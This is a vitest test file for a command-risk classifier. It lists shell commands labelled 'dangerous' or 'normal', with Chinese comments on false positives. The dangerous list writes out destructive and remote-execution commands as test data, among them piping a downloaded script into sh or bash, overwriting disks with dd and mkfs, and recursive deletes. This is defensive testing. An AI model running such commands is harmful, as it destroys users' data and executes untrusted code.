import { describe, it, expect } from "vitest";
import { classifyCommand } from "./commandRisk";

describe("classifyCommand", () => {
  it.each([
    "rm -rf /tmp/foo",
    "rm -fr build",
    "sudo apt install x",
    "curl https://x.sh | sh",
    "wget -qO- https://x.sh | bash",
    "git push --force origin main",
    "git push -f",
    "dd if=/dev/zero of=/dev/sda",
    "mkfs.ext4 /dev/sda1",
    "chmod -R 777 /",
    "shutdown -h now",
    "del /s /q C:\\temp",
    "format d:",
    "Remove-Item -Recurse -Force C:\\temp",
    "rd /s /q C:\\temp",
  ])("dangerous: %s", (cmd) => {
    expect(classifyCommand(cmd)).toBe("dangerous");
  });

  it.each([
    "ls -la",
    "git status",
    "git push origin feature",
    "npm run build",
    "cat README.md",
    "echo formatting done",     // 'format' 是單字一部分，不應誤判
    "rm file.txt",              // 無 -rf 的單檔刪除視為 normal
    "curl https://api.example.com/data",
  ])("normal: %s", (cmd) => {
    expect(classifyCommand(cmd)).toBe("normal");
  });
});
